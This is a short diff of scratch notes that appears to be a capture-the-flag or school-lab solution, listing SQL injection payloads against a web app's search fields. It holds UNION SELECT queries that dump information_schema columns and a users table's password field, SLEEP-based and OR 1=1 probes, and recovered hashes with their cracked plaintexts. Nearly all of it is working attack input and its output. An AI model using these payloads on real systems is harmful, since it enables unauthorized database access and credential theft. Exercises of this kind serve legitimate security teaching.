@@ -1,0 +1,10 @@
+1 UNION SELECT column_name, table_name FROM information_schema.columns;
+2 1 UNION SELECT Commentaire , countersign FROM users 
+tag:5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo 
+
+
+imahgeserch:
+1 UNION SELECT NULL, NULL--
+1 UNION SELECT SLEEP(3) column_name, table_name FROM information_schema.columns;
+1  OR 1 = 1 UNION   SELECT SLEEP(3) url, comment FROM list_images 
+tags: 1928e8083cf461a51303633093573c46 =  albatroz
